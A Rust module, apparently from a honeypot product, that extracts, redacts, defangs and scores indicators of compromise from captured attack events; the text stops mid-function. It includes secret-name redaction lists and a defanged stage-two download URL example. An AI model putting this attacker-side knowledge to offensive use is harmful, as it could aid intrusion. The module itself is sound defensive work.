//! IOC extraction (#34): indicators pulled out of attempts (#25) and their
//! capture events, deduplicated per value, with first and last seen, links
//! back to attempts and campaigns (#33), ASN context for addresses (#11) and
//! a confidence score (#27).
//!
//! Extraction is deterministic and only parses stored evidence. Nothing is
//! fetched, resolved or executed: payloads are never run to "produce better
//! IOCs". Attacker-controlled values are hostile: `value` keeps the exact
//! string (after secret and personal information redaction) for machines,
//! and `display` is defanged and escaped for people.
//!
//! When an attempt reached post-exploitation without leaving a file (a
//! memory-resident implant), its IOCs say so with `file_ioc_limited` and no
//! file hash is invented. Command lines, behaviour fingerprints and network
//! callbacks carry the weight instead.
//!
//! See `docs/iocs.md`. Contract: `schemas/ioc.schema.json`.

use std::collections::{BTreeMap, BTreeSet};
use std::net::IpAddr;

use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::{Digest, Sha256};

use crate::attempt::{Attempt, AttemptState, StateSignal};
use crate::canary;
use crate::capture::{CaptureEvent, Channel, HookStage, PayloadRef};
use crate::confidence::{Band, ConfidenceConfig, Evidence, EvidenceSource, LinkKind, score};
use crate::enrichment::{Fact, Observable, ObservableKind, is_never_redistribute};
use crate::timeline::printable;

/// Longest value kept, in characters. Longer request strings and command
/// lines are dropped rather than cut, because a cut value is no longer an
/// exact indicator; their hashes still become IOCs.
pub const MAX_VALUE_CHARS: usize = 2048;
/// Longest user agent kept, in characters.
pub const MAX_UA_CHARS: usize = 512;
/// Most event ids listed on one IOC. `sightings` still counts every event.
pub const MAX_EVENT_REFS: usize = 32;
/// Most distinct IOCs taken from one attempt.
pub const MAX_IOCS_PER_ATTEMPT: usize = 256;
/// Most normalised steps hashed into a behaviour fingerprint.
pub const MAX_FINGERPRINT_STEPS: usize = 64;
/// Most URLs taken from one command line or text field.
pub const MAX_URLS_PER_TEXT: usize = 8;
/// Most attempts and decoys that add confidence evidence to one IOC.
pub const MAX_CONFIDENCE_ITEMS: usize = 16;
/// Version of the behaviour fingerprint format (`bf1:`).
pub const FINGERPRINT_VERSION: u32 = 1;

const FINGERPRINT_DOMAIN: &str = "foiled-behaviour-fingerprint/v1";
const REDACTED: &str = "REDACTED";

/// Parameter and field names whose values are treated as secrets.
const SECRET_KEYS: &[&str] = &[
    "access_token",
    "api_key",
    "apikey",
    "auth",
    "credential",
    "credentials",
    "jwt",
    "pass",
    "passwd",
    "password",
    "pwd",
    "secret",
    "session",
    "sessionid",
    "token",
];

/// Command-line flags whose next word is a secret.
const SECRET_FLAGS: &[&str] = &[
    "--api-key",
    "--apikey",
    "--pass",
    "--password",
    "--secret",
    "--token",
    "bearer",
    "basic",
];

/// Protocol commands whose arguments are credentials.
const SECRET_COMMANDS: &[&str] = &["AUTH", "LOGIN", "PASS"];

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IocType {
    /// IPv4 address.
    Ip,
    Ipv6,
    Domain,
    Url,
    /// Request path and query, exactly as sent (after redaction).
    HttpPath,
    /// HTTP User-Agent header.
    HttpUa,
    /// An exact request string: a protocol command, or an inline body or
    /// request slice when payload storage is on (#16).
    RequestSubstring,
    /// SHA-256 of what was sent to the decoy (body or request slice).
    PayloadSha256,
    /// SHA-256 of a file the attacker left (quarantine, implant).
    FileSha256,
    /// A command the attacker ran or tried to run.
    Cmdline,
    /// A DNS name the decoy was made to look up.
    DnsQuery,
    /// Stable id over the attempt's normalised steps (`bf1:`).
    BehaviourFingerprint,
}

impl IocType {
    pub const ALL: [IocType; 12] = [
        IocType::Ip,
        IocType::Ipv6,
        IocType::Domain,
        IocType::Url,
        IocType::HttpPath,
        IocType::HttpUa,
        IocType::RequestSubstring,
        IocType::PayloadSha256,
        IocType::FileSha256,
        IocType::Cmdline,
        IocType::DnsQuery,
        IocType::BehaviourFingerprint,
    ];

    pub fn as_str(self) -> &'static str {
        match self {
            IocType::Ip => "ip",
            IocType::Ipv6 => "ipv6",
            IocType::Domain => "domain",
            IocType::Url => "url",
            IocType::HttpPath => "http_path",
            IocType::HttpUa => "http_ua",
            IocType::RequestSubstring => "request_substring",
            IocType::PayloadSha256 => "payload_sha256",
            IocType::FileSha256 => "file_sha256",
            IocType::Cmdline => "cmdline",
            IocType::DnsQuery => "dns_query",
            IocType::BehaviourFingerprint => "behaviour_fingerprint",
        }
    }

    pub fn parse(s: &str) -> Option<IocType> {
        IocType::ALL.into_iter().find(|t| t.as_str() == s)
    }

    /// Types whose values compare without regard to ASCII case.
    pub fn case_insensitive(self) -> bool {
        matches!(
            self,
            IocType::Ip
                | IocType::Ipv6
                | IocType::Domain
                | IocType::DnsQuery
                | IocType::PayloadSha256
                | IocType::FileSha256
                | IocType::BehaviourFingerprint
        )
    }
}

/// What the value was to the attack. One IOC can hold several roles, for
/// example an address that both attacked and served the second stage.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IocRole {
    /// Where the attack came from.
    Source,
    /// Exact strings from the attacker's requests.
    Request,
    /// What reached the decoy or the vulnerable code, by hash or exact slice.
    Payload,
    /// Where the decoy was made to call back to (DNS, egress, exfiltration).
    Callback,
    /// A second-stage download location.
    Stage2,
    /// Something the attacker ran or left after exploitation.
    PostExploit,
    /// A behaviour fingerprint.
    Behaviour,
}

/// Where an IOC came from. Extraction only produces `observed`; values found
/// by pivoting on enrichment data are `enrichment_pivot` and are never
/// contributed back (`docs/contribute-back.md`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IocOrigin {
    Observed,
    EnrichmentPivot,
}

/// ASN or country context for an address, from an enrichment Fact (#11).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct EnrichmentRef {
    pub provider: String,
    /// `asn.number`, `asn.org` or `geo.country`.
    pub key: String,
    pub value: Value,
    pub observed_at: i64,
    /// False when the provider is on the never-redistribute list. Exports
    /// drop those refs ([`redact_for_export`]).
    pub shareable: bool,
}

/// What a behaviour fingerprint was computed over.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct FingerprintDetail {
    pub version: u32,
    /// Normalised steps in order, exactly as hashed.
    pub steps: Vec<String>,
}

/// The #27 score for the indicator, condensed from a `ConfidenceLink` of
/// kind `attempt_ioc`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct IocConfidence {
    pub score: u8,
    pub band: Band,
    pub wording: String,
    pub publishable: bool,
    pub evidence: Vec<Evidence>,
    pub caps_applied: Vec<String>,
}

/// One indicator. Mirrors `schemas/ioc.schema.json`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Ioc {
    /// `ioc_` plus 24 hex characters over type and value. The same value
    /// always has the same id, across attempts, windows and tenants.
    pub ioc_id: String,
    #[serde(rename = "type")]
    pub ioc_type: IocType,
    /// Exact normalised value. Hostile text: escape before rendering.
    pub value: String,
    /// Defanged and escaped for people. Never parse this.
    pub display: String,
    pub roles: Vec<IocRole>,
    pub origin: IocOrigin,
    /// True when secrets or personal information were removed from `value`.
    pub redacted: bool,
    /// True when an attempt this was seen in reached post-exploitation
    /// without a captured file, so file hashes are missing on purpose.
    pub file_ioc_limited: bool,
    pub first_seen: i64,
    pub last_seen: i64,
    /// Capture events the value was seen in (attempts, for fingerprints).
    pub sightings: u32,
    pub attempt_ids: Vec<String>,
    pub campaign_ids: Vec<String>,
    pub decoy_ids: Vec<String>,
    pub catalogue_ids: Vec<String>,
    /// Up to [`MAX_EVENT_REFS`] event ids, oldest first.
    pub event_ids: Vec<String>,
    /// `channel:field` pairs the value was read from.
    pub extracted_from: Vec<String>,
    pub enrichment: Vec<EnrichmentRef>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub fingerprint: Option<FingerprintDetail>,
    pub confidence: IocConfidence,
}

/// The IOC side of one attempt.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct AttemptIocs {
    pub attempt_id: String,
    /// IOC ids in order of first appearance in the attempt.
    pub ioc_refs: Vec<String>,
    pub file_ioc_limited: bool,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Default, PartialEq)]
pub struct Extraction {
    /// Sorted by first seen, then type, then value.
    pub iocs: Vec<Ioc>,
    /// One per input attempt, in input order.
    pub attempts: Vec<AttemptIocs>,
}

impl Extraction {
    pub fn for_attempt(&self, attempt_id: &str) -> Option<&AttemptIocs> {
        self.attempts.iter().find(|a| a.attempt_id == attempt_id)
    }

    pub fn get(&self, ioc_id: &str) -> Option<&Ioc> {
        self.iocs.iter().find(|i| i.ioc_id == ioc_id)
    }
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct ExtractOptions {
    /// Mirrors `store_payloads` in the retention config (#16). Off: inline
    /// bodies and request slices are never IOC values, only their hashes.
    pub store_payloads: bool,
}

/// `ioc_` plus 24 hex characters of SHA-256 over type and value.
pub fn ioc_id(ty: IocType, value: &str) -> String {
    let h = Sha256::digest(format!("{}\n{value}", ty.as_str()).as_bytes());
    format!("ioc_{}", hex::encode(&h[..12]))
}

// ---------------------------------------------------------------------------
// Redaction, defanging and refanging
// ---------------------------------------------------------------------------

/// Remove secrets and personal information from attacker text: URL
/// credentials, secret-looking parameters and flags, bearer tokens and the
/// local part of email addresses. Returns the new text and whether anything
/// changed. Linear in the input.
pub fn redact(s: &str) -> (String, bool) {
    let out = redact_emails(&redact_flags(&redact_pairs(&redact_userinfo(s))));
    let changed = out != s;
    (out, changed)
}

fn redact_userinfo(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(i) = rest.find("://") {
        let (head, tail) = rest.split_at(i + 3);
        out.push_str(head);
        let end = tail
            .find(|c: char| matches!(c, '/' | '?' | '#' | '\'' | '"') || c.is_whitespace())
            .unwrap_or(tail.len());
        let authority = &tail[..end];
        match authority.rfind('@') {
            Some(at) => {
                out.push_str(REDACTED);
                out.push_str(&authority[at..]);
            }
            None => out.push_str(authority),
        }
        rest = &tail[end..];
    }
    out.push_str(rest);
    out
}

fn value_end(c: char) -> bool {
    matches!(c, '&' | ';' | '\'' | '"' | '#') || c.is_whitespace()
}

fn redact_pairs(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        out.push(c);
        if c != '=' {
            continue;
        }
        let before = &out[..out.len() - 1];
        let key_len = before
            .chars()
            .rev()
            .take(33)
            .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
            .count();
        if key_len == 0 || key_len > 32 {
            continue;
        }
        let key = before[before.len() - key_len..].to_ascii_lowercase();
        let starts_word = before[..before.len() - key_len]
            .chars()
            .next_back()
            .is_none_or(|p| matches!(p, '?' | '&' | ';' | '\'' | '"' | '-') || p.is_whitespace());
        if !starts_word || !SECRET_KEYS.contains(&key.as_str()) {
            continue;
        }
        let mut skipped = false;
        while let Some(&n) = chars.peek() {
            if value_end(n) {
                break;
            }
            chars.next();
            skipped = true;
        }
        if skipped {
            out.push_str(REDACTED);
        }
    }
    out
}

fn redact_flags(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut redact_next = false;
    for piece in s.split_inclusive(char::is_whitespace) {
        let word = piece.trim_end();
        let tail = &piece[word.len()..];
        if redact_next && !word.is_empty() {
            out.push_str(REDACTED);
            out.push_str(tail);
            redact_next = false;
            continue;
        }
        out.push_str(piece);
        let w = word
            .trim_matches(|c| matches!(c, '\'' | '"'))
            .to_ascii_lowercase();
        if SECRET_FLAGS.contains(&w.as_str()) {
            redact_next = true;
        }
    }
    out
}

fn redact_emails(s: &str) -> String {
    let local_char =
        |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '%' | '+' | '-');
    let mut out = String::with_capacity(s.len());
    for (i, c) in s.char_indices() {
        if c == '@' {
            let domain: String = s[i + 1..]
                .chars()
                .take(254)
                .take_while(|d| d.is_ascii_alphanumeric() || matches!(d, '.' | '-'))
                .collect();
            let domain = domain.trim_end_matches('.');
            let tld_ok = domain.rsplit_once('.').is_some_and(|(_, tld)| {
                tld.len() >= 2 && tld.bytes().all(|b| b.is_ascii_alphabetic())
            });
            let local_len = out
                .chars()
                .rev()
                .take(65)
                .take_while(|ch| local_char(*ch))
                .count();
            if tld_ok && (1..=64).contains(&local_len) {
                let local = &out[out.len() - local_len..];
                if local != REDACTED {
                    out.truncate(out.len() - local_len);
                    out.push_str(REDACTED);
                }
            }
        }
        out.push(c);
    }
    out
}

/// Replace URL schemes with their defanged forms, ignoring ASCII case.
fn defang_schemes(s: &str) -> String {
    let mut out = s.to_string();
    for (from, to) in [
        ("https://", "hxxps://"),
        ("http://", "hxxp://"),
        ("ftp://", "fxp://"),
    ] {
        let lower = out.to_ascii_lowercase();
        let mut next = String::with_capacity(out.len() + 8);
        let mut last = 0;
        for (i, _) in lower.match_indices(from) {
            next.push_str(&out[last..i]);
            next.push_str(to);
            last = i + from.len();
        }
        next.push_str(&out[last..]);
        out = next;
    }
    out
}

/// The defanged, escaped form shown to people: `203[.]0[.]113[.]7`,
/// `hxxp://stage2[.]example[.]invalid/x.sh`. Never parse it back.
pub fn defang(ty: IocType, value: &str) -> String {
    let d = match ty {
        IocType::Ip | IocType::Domain | IocType::DnsQuery => value.replace('.', "[.]"),
        IocType::Ipv6 => value.replace(':', "[:]"),
        IocType::Url => {
            let s = defang_schemes(value);
            match s.find("://") {
                Some(i) => {
                    let start = i + 3;
                    let end = s[start..]
                        .find(['/', '?', '#'])
                        .map_or(s.len(), |e| start + e);
                    format!(
                        "{}{}{}",
                        &s[..start],
                        s[start..end].replace('.', "[.]"),
                        &s[end..]
                    )
                }
                None => s,
            }
        }
        _ => defang_schemes(value),
    };
    printable(&d)
}

/// Undo common defanging so a pasted indicator can be searched.
pub fn refang(s: &str) -> String {
    let s = s
        .trim()
        .replace("[.]", ".")
        .replace("(.)", ".")
        .replace("[:]", ":")
        .replace("[://]", "://");
    let lower = s.to_ascii_lowercase();
    for (from, to) in [
        ("hxxps://", "https://"),
        ("hxxp://", "http://"),
        ("fxp://", "ftp://"),
    ] {
        if lower.starts_with(from) {
            return format!("{to}{}", &s[from.len()..]);
        }
    }
    s
}

// ---------------------------------------------------------------------------
// Candidates from capture events
// ---------------------------------------------------------------------------

struct Candidate {
    ty: IocType,
    value: String,
    redacted: bool,
    role: IocRole,
    field: String,
    events: Vec<(i64, String)>,
    fingerprint: Option<FingerprintDetail>,
}

fn text<'a>(e: &'a CaptureEvent, k: &str) -> Option<&'a str> {
    e.data
        .get(k)
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|s| !s.is_empty())
}

fn words(v: Option<&Value>) -> Option<String> {
    match v? {
        Value::String(s) => Some(s.trim().to_string()).filter(|s| !s.is_empty()),
        Value::Array(a) => {
            let parts: Vec<String> = a
                .iter()
                .filter_map(|x| match x {
                    Value::String(s) => Some(s.clone()),
                    Value::Number(n) => Some(n.to_string()),
                    _ => None,
                })
                .collect();
            Some(parts.join(" ")).filter(|s| !s.trim().is_empty())
        }
        _ => None,
    }
}

fn too_long(s: &str, max: usize) -> bool {
    s.chars().nth(max).is_some()
}

/// Values that name a planted canary or its beacon are never IOCs: they are
/// Foiled's own secrets, not the attacker's infrastructure (#17).
fn names_canary(v: &str, e: &CaptureEvent) -> bool {
    let l = v.to_ascii_lowercase();
    [
        canary::PREFIX,
        canary::DB_USER_PREFIX,
        canary::CLOUD_SECRET_PREFIX,
        canary::DB_HOST,
    ]
    .iter()
    .any(|m| l.contains(&m.to_ascii_lowercase()))
        || text(e, "canary_id").is_some_and(|id| v.contains(id))
}

fn norm_ip(raw: &str) -> Option<(IocType, String)> {
    let o = Observable::ip(raw).ok()?;
    // The decoy's own network (guest, bridge, resolver) is never an IOC.
    if !o.is_external_lookup_eligible() {
        return None;
    }
    let ty = if o.value.contains(':') {
        IocType::Ipv6
    } else {
        IocType::Ip
    };
    Some((ty, o.value))
}

fn norm_domain(raw: &str) -> Option<String> {
    let o = Observable::domain(raw).ok()?;
    // Single-label names are local, not attacker infrastructure.
    o.value.contains('.').then_some(o.value)
}

/// Host part of a URL authority or a Host header, without port or
/// credentials.
fn host_of(authority: &str) -> &str {
    let a = authority.rsplit('@').next().unwrap_or("");
    if let Some(rest) = a.strip_prefix('[') {
        return rest.split(']').next().unwrap_or("");
    }
    match a.split_once(':') {
        Some((h, port)) if !port.contains(':') => h,
        _ => a,
    }
}

fn url_authority(url: &str) -> Option<&str> {
    let rest = &url[url.find("://")? + 3..];
    Some(&rest[..rest.find(['/', '?', '#']).unwrap_or(rest.len())])
}

struct Sink<'a> {
    e: &'a CaptureEvent,
    out: &'a mut Vec<Candidate>,
}

impl Sink<'_> {
    fn push(&mut self, ty: IocType, value: String, redacted: bool, role: IocRole, field: &str) {
        self.out.push(Candidate {
            ty,
            value,
            redacted,
            role,
            field: format!("{}:{field}", self.e.channel.as_str()),
            events: vec![(self.e.ts, self.e.event_id.clone())],
            fingerprint: None,
        });
    }

    fn ip(&mut self, raw: &str, role: IocRole, field: &str) {
        if let Some((ty, v)) = norm_ip(raw) {
            self.push(ty, v, false, role, field);
        }
    }

    /// A host name or address literal, as found in a Host header or URL.
    fn host(&mut self, raw: &str, role: IocRole, field: &str) {
        let h = host_of(raw.trim());
        if h.parse::<IpAddr>().is_ok() {
            self.ip(h, role, field);
        } else if !names_canary(h, self.e)
            && let Some(d) = norm_domain(h)
        {
            self.push(IocType::Domain, d, false, role, field);
        }
    }

    fn sha(&mut self, ty: IocType, raw: &str, role: IocRole, field: &str) {
        if let Ok(o) = Observable::sha256(raw) {
            self.push(ty, o.value, false, role, field);
        }
    }

    fn text(&mut self, ty: IocType, raw: &str, max: usize, role: IocRole, field: &str) {
        let raw = raw.trim();
        if raw.is_empty() || too_long(raw, max) || names_canary(raw, self.e) {
            return;
        }
        let (v, redacted) = redact(raw);
        self.push(ty, v, redacted, role, field);
    }

    fn url(&mut self, raw: &str, role: IocRole, field: &str) {
        let raw = raw.trim();
        if names_canary(raw, self.e) || Observable::new(ObservableKind::Url, raw).is_err() {
            return;
        }
        let Some(i) = raw.find("://") else { return };
        let auth_end = raw[i + 3..]
            .find(['/', '?', '#'])
            .map_or(raw.len(), |e| i + 3 + e);
        let lowered = format!(
            "{}{}",
            raw[..auth_end].to_ascii_lowercase(),
            &raw[auth_end..]
        );
        let (v, redacted) = redact(&lowered);
        let host = url_authority(&v).map(host_of).unwrap_or("").to_string();
        self.push(IocType::Url, v, redacted, role, field);
        if !host.is_empty() {
            self.host(&host, role, field);
        }
    }

    /// URLs inside free text such as a command line.
    fn urls_in(&mut self, s: &str, role: IocRole, field: &str) {
        let lower = s.to_ascii_lowercase();
        let mut found = 0;
        let mut from = 0;
        while found < MAX_URLS_PER_TEXT {
            let next = ["http://", "https://", "ftp://"]
                .iter()
                .filter_map(|p| lower[from..].find(p).map(|i| from + i))
                .min();
            let Some(start) = next else { break };
            let end = s[start..]
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '\'' | '"' | '<' | '>' | '|' | ';' | '`' | ')')
                })
                .map_or(s.len(), |e| start + e);
            self.url(&s[start..end], role, field);
            found += 1;
            from = end.max(start + 1);
        }
    }

    fn cmdline(&mut self, raw: &str, field: &str) {
        self.text(
            IocType::Cmdline,
            raw,
            MAX_VALUE_CHARS,
            IocRole::PostExploit,
            field,
        );
        if !too_long(raw, MAX_VALUE_CHARS) {
            self.urls_in(raw, IocRole::Stage2, field);
        }
    }
}

fn candidates(e: &CaptureEvent, opts: ExtractOptions, out: &mut Vec<Candidate>) {
    let mut s = Sink { e, out };
    let ua = |s: &mut Sink| {
        if let Some((k, v)) = ["user_agent", "ua"]
            .iter()
            .find_map(|k| text(e, k).map(|v| (*k, v)))
        {
            s.text(
                IocType::HttpUa,
                v,
                MAX_UA_CHARS,
                IocRole::Request,
                &format!("data.{k}"),
            );
        }
    };
    match e.channel {
        Channel::Network => s.ip(&e.src.ip, IocRole::Source, "src.ip"),
        Channel::Application => {
            s.ip(&e.src.ip, IocRole::Source, "src.ip");
            if text(e, "method").is_some() {
                if let Some(p) = text(e, "path").filter(|p| p.starts_with('/') && *p != "/") {
                    s.text(
                        IocType::HttpPath,
                        p,
                        MAX_VALUE_CHARS,
                        IocRole::Request,
                        "data.path",
                    );
                }
            } else if let Some(cmd) = text(e, "command") {
                let args = words(e.data.get("args")).unwrap_or_default();
                let secret = !args.is_empty()
                    && SECRET_COMMANDS.contains(&cmd.to_ascii_uppercase().as_str());
                let line = if args.is_empty() {
                    cmd.to_string()
                } else if secret {
                    format!("{cmd} {REDACTED}")
                } else {
                    format!("{cmd} {args}")
                };
                let before = s.out.len();
                s.text(
                    IocType::RequestSubstring,
                    &line,
                    MAX_VALUE_CHARS,
                    IocRole::Request,
                    "data.command",
                );
                if secret && s.out.len() > before {
                    s.out[before].redacted = true;
                }
            }
            ua(&mut s);
            if opts.store_payloads
                && let Some(b) = text(e, "body")
            {
                s.text(
                    IocType::RequestSubstring,
                    b,
                    MAX_VALUE_CHARS,
                    IocRole::Payload,
                    "data.body",
                );
            }
            if let Some(h) = text(e, "body_sha256") {
                s.sha(
                    IocType::PayloadSha256,
                    h,
                    IocRole::Payload,
                    "data.body_sha256",
                );
            }
            if let Some(p) = e.payload_ref.as_deref().and_then(PayloadRef::parse) {
                s.sha(
                    IocType::PayloadSha256,
                    &p.sha256,
                    IocRole::Payload,
                    "payload_ref",
                );
            }
        }
        Channel::Hook => {
            s.ip(&e.src.ip, IocRole::Source, "src.ip");
            if let Some(p) = text(e, "request_path").filter(|p| p.starts_with('/') && *p != "/") {
                s.text(
                    IocType::HttpPath,
                    p,
                    MAX_VALUE_CHARS,
                    IocRole::Request,
                    "data.request_path",
                );
            }
            if let Some(h) = text(e, "request_slice_sha256") {
                s.sha(
                    IocType::PayloadSha256,
                    h,
                    IocRole::Payload,
                    "data.request_slice_sha256",
                );
            }
            if opts.store_payloads
                && let Some(b) = text(e, "request_slice")
            {
                s.text(
                    IocType::RequestSubstring,
                    b,
                    MAX_VALUE_CHARS,
                    IocRole::Payload,
                    "data.request_slice",
                );
            }
            if let Some(h) = &e.hook {
                if let Some(p) = h.request_slice_ref.as_deref().and_then(PayloadRef::parse) {
                    s.sha(
                        IocType::PayloadSha256,
                        &p.sha256,
                        IocRole::Payload,
                        "hook.request_slice_ref",
                    );
                }
                for l in &h.cmd_lines {
                    s.cmdline(l, "hook.cmd_lines");
                }
                for r in &h.implant_refs {
                    if let Some(p) = PayloadRef::parse(r) {
                        s.sha(
                            IocType::FileSha256,
                            &p.sha256,
                            IocRole::PostExploit,
                            "hook.implant_refs",
                        );
                    }
                }
            }
        }
        Channel::Process => {
            if let Some((k, line)) = ["cmdline", "argv"]
                .iter()
                .find_map(|k| words(e.data.get(*k)).map(|v| (*k, v)))
            {
                s.cmdline(&line, &format!("data.{k}"));
            }
        }
        Channel::Filesystem | Channel::Quarantine => {
            if let Some(h) = text(e, "sha256") {
                s.sha(IocType::FileSha256, h, IocRole::PostExploit, "data.sha256");
            }
            if e.channel == Channel::Quarantine
                && let Some(p) = e.payload_ref.as_deref().and_then(PayloadRef::parse)
            {
                s.sha(
                    IocType::FileSha256,
                    &p.sha256,
                    IocRole::PostExploit,
                    "payload_ref",
                );
            }
        }
        Channel::Dns => {
            if let Some((k, q)) = ["query", "qname"]
                .iter()
                .find_map(|k| text(e, k).map(|v| (*k, v)))
                && !names_canary(q, e)
                && let Some(d) = norm_domain(q)
            {
                let field = format!("data.{k}");
                s.push(
                    IocType::DnsQuery,
                    d.clone(),
                    false,
                    IocRole::Callback,
                    &field,
                );
                s.push(IocType::Domain, d, false, IocRole::Callback, &field);
            }
        }
        Channel::Egress => {
            if text(e, "detector") == Some("beacon") {
                // The beacon listener saw a planted canary used: the source
                // is the attacker, the path is Foiled's own beacon.
                s.ip(&e.src.ip, IocRole::Source, "src.ip");
                ua(&mut s);
                return;
            }
            let method = text(e, "method").map(str::to_ascii_uppercase);
            let role = if method.as_deref() == Some("GET") {
                IocRole::Stage2
            } else {
                IocRole::Callback
            };
            if let Some(d) = &e.dst {
                s.ip(&d.ip, role, "dst.ip");
            }
            if let Some(h) = text(e, "host") {
                s.host(h, role, "data.host");
            }
            if let Some(u) = text(e, "url") {
                s.url(u, role, "data.url");
            } else if let (Some(h), Some(p)) = (text(e, "host"), text(e, "path")) {
                let port = e.dst.as_ref().and_then(|d| d.port);
                let scheme = match text(e, "scheme").map(str::to_ascii_lowercase).as_deref() {
                    Some("https") => "https",
                    Some("http") => "http",
                    _ if port == Some(443) => "https",
                    _ => "http",
                };
                let host = host_of(h);
                let port_part = match port {
                    None | Some(80) | Some(443) => String::new(),
                    Some(p) => format!(":{p}"),
                };
                let path = if p.starts_with('/') {
                    p.to_string()
                } else {
                    format!("/{p}")
                };
                s.url(
                    &format!("{scheme}://{host}{port_part}{path}"),
                    role,
                    "data.host+data.path",
                );
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Behaviour fingerprint
// ---------------------------------------------------------------------------

/// Path without query values, digit runs folded to `0`, plus the sorted
/// query parameter names: `/api/upload?path`.
fn path_shape(p: &str) -> String {
    let (path, query) = p.split_once('?').unwrap_or((p, ""));
    let path = path.split('#').next().unwrap_or("");
    let mut shaped = String::new();
    let mut in_digits = false;
    for c in path.chars().take(96) {
        if c.is_ascii_digit() {
            if !in_digits {
                shaped.push('0');
            }
            in_digits = true;
        } else {
            shaped.push(c);
            in_digits = false;
        }
    }
    let names: BTreeSet<&str> = query
        .split('#')
        .next()
        .unwrap_or("")
        .split('&')
        .filter_map(|kv| kv.split('=').next())
        .filter(|k| !k.is_empty())
        .take(16)
        .collect();
    if !names.is_empty() {
        shaped.push('?');
        shaped.push_str(&names.into_iter().collect::<Vec<_>>().join("&"));
    }
    shaped
}

/// Program name of a command line: the first word's basename.
fn program(line: &str) -> Option<String> {
    let first = line.split_whitespace().next()?;
    let first = first.trim_matches(|c| matches!(c, '\'' | '"' | '(' | '`'));
    let base = first.rsplit('/').next().unwrap_or(first);
    let base: String = base.chars().take(32).collect();
    (!base.is_empty()).then_some(base)
}

fn stage(s: HookStage) -> &'static str {
    match s {
        HookStage::Trigger => "trigger",
        HookStage::PostExploit => "post_exploit",
        HookStage::Cleanup => "cleanup",
    }
}

/// Normalised steps for one event. Volatile values (addresses, host names,
/// query values, file names) are left out so the same tool gives the same
/// steps from anywhere.
fn steps_for(e: &CaptureEvent) -> Vec<String> {
    let raw: Vec<String> = match e.channel {
        Channel::Application => {
            if let Some(m) = text(e, "method") {
                vec![format!(
                    "http {} {}",
                    m.to_ascii_uppercase(),
                    path_shape(text(e, "path").unwrap_or("/"))
                )]
            } else if let Some(c) = text(e, "command") {
                let first = words(e.data.get("args"))
                    .and_then(|a| a.split_whitespace().next().map(str::to_ascii_uppercase))
                    .unwrap_or_default();
                vec![
                    format!("cmd {} {first}", c.to_ascii_uppercase())
                        .trim_end()
                        .to_string(),
                ]
            } else {
                vec![]
            }
        }
        Channel::Hook => match &e.hook {
            Some(h) => std::iter::once(format!("hook {} {}", h.hook_id, stage(h.stage)))
                .chain(
                    h.cmd_lines
                        .iter()
                        .filter_map(|l| program(l))
                        .map(|p| format!("exec {p}")),
                )
                .collect(),
            None => vec![],
        },
        Channel::Process => ["cmdline", "argv"]
            .iter()
            .find_map(|k| words(e.data.get(*k)))
            .and_then(|l| program(&l))
            .map(|p| vec![format!("exec {p}")])
            .unwrap_or_default(),
        Channel::Dns => vec![format!(
            "dns {}",
            text(e, "qtype").unwrap_or("A").to_ascii_uppercase()
        )],
        Channel::Egress => {
            if text(e, "detector") == Some("beacon") {
                vec!["canary beacon".to_string()]
            } else {
                vec![format!(
                    "egress {}",
                    text(e, "method")
                        .map(str::to_ascii_uppercase)
                        .unwrap_or_else(|| "CONNECT".into())
                )]
            }
        }
        Channel::Filesystem => vec![format!("fs {}", text(e, "op").unwrap_or("write"))],
        Channel::Quarantine => vec!["quarantine".to_string()],
        Channel::Network => vec![],
    };
    raw.iter().map(|s| printable(s)).collect()
}

/// The behaviour fingerprint for an attempt that got past probing:
/// `bf1:` plus 32 hex characters of SHA-256 over the normalised steps,
/// in order, with repeats collapsed. `None` for probe-only attempts and
/// for fewer than two steps, which would match every scanner.
fn fingerprint(a: &Attempt, mine: &[&CaptureEvent]) -> Option<Candidate> {
    if a.state == AttemptState::Probe {
        return None;
    }
    let mut keyed: Vec<(i64, u32, Vec<String>, &CaptureEvent)> = mine
        .iter()
        .map(|e| {
            let seq = e.hook.as_ref().map_or(0, |h| h.sequence_no);
            (e.ts, seq, steps_for(e), *e)
        })
        .filter(|k| !k.2.is_empty())
        .collect();
    // Ties on time are broken by the steps themselves, never by event id, so
    // the same behaviour gives the same order whatever ids the sender chose.
    // An event's own steps keep their order (a hook, then its commands).
    keyed.sort_by(|x, y| (x.0, x.1, &x.2).cmp(&(y.0, y.1, &y.2)));
    let mut steps: Vec<String> = Vec::new();
    let mut events: Vec<(i64, String)> = Vec::new();
    'outer: for (ts, _, event_steps, e) in keyed {
        for s in event_steps {
            if steps.last() != Some(&s) {
                if steps.len() == MAX_FINGERPRINT_STEPS {
                    break 'outer;
                }
                steps.push(s);
            }
        }
        events.push((ts, e.event_id.clone()));
    }
    if steps.len() < 2 {
        return None;
    }
    let h = Sha256::digest(format!("{FINGERPRINT_DOMAIN}\n{}", steps.join("\n")).as_bytes());
    Some(Candidate {
        ty: IocType::BehaviourFingerprint,
